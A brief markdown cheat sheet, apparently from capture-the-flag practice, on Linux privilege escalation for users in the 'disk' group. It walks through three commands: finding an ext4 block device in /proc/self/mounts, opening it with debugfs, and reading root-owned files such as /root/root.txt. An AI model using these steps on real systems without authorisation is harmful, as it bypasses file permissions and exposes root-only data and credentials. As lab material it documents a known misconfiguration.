# Disk Group Privilege Escalation

## Steps:

### 1) Check which devices are run inside the machine

    cat /proc/self/mounts | grep 'sda'

### 2) If we found a device with the ext4 filesystem, this could possibly mean that it is our target's filesystem. Access it with the command

    debugfs /dev/sda5

### 3) Then you are free to roam the entire filesystem (yes, even files owned by root)

    cat /root/root.txt
